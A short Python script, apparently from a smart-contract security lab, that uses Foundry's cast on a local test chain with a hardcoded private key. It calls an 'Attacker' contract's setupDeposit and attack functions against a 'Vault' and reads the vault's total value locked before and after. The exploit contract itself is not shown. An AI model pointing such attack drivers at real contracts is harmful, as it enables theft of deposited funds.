import json, subprocess
with open('contracts/out/deploy-addresses.json') as f:
    addrs = json.load(f)
attacker = addrs['Attacker']
vault = addrs['Vault']
pk = '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d'
rpc = 'http://localhost:8545'

def run_cast(sig, addr, val):
    cmd = f'cast send {addr} "{sig}" {val} --private-key {pk} --rpc-url {rpc}'
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"{sig} on {addr}:\n", res.stdout)
    if res.stderr: print("ERR:", res.stderr)

run_cast('totalTVL()(uint256)', vault, '')
run_cast('setupDeposit(uint256)', attacker, '10000000000000000000')
run_cast('totalTVL()(uint256)', vault, '')
run_cast('attack(uint256)', attacker, '10000000000000000000')
run_cast('totalTVL()(uint256)', vault, '')
